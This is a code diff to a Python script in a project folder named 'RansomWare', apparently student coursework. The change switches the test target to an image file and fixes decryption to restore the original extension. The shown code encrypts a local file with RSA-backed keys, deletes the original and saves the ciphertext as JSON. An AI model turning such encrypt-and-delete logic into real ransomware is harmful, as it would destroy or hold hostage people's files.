@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import (hashes, hmac, serialization)
 from cryptography.hazmat.primitives import (padding, asymmetric)
 
-fileToEncrypt = 'C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles/Texts/testText.txt'
+fileToEncrypt = 'C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles/Images/image.png'
 rsa_public_key_file_path = "C:/Users/Hanson/Desktop/Team-1/RansomWare/KeyFiles/public.pem"
 rsa_private_key_file_path = "C:/Users/Hanson/Desktop/Team-1/RansomWare/KeyFiles/private.pem"
 
@@ -220,7 +220,14 @@ os.remove(fileToEncrypt)
 fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
 createFile(fileName, jsonObj)
 
-m, e = MyFileDecrypt(fileName, rsa_private_key_file_path)
-decrypted_file = open(os.path.splitext(fileToEncrypt)[0] + "Decrypted" + ".txt", "wb")
-decrypted_file.write(m)
-decrypted_file.close()
+#m, e = MyFileDecrypt(fileName, rsa_private_key_file_path)
+#decrypted_file = open(os.path.splitext(fileToEncrypt)[0] + "Decrypted" + e, "wb")
+#decrypted_file.write(m)
+#decrypted_file.close()
+
+# Works with Images again
+message, ext = MyFileDecrypt(fileName, rsa_private_key_file_path)
+newFileName = os.path.splitext(fileToEncrypt)[0] + "Decrypted" + ext
+newFile = open(newFileName, "wb")
+# Write the message to the file
+newFile.write(message)
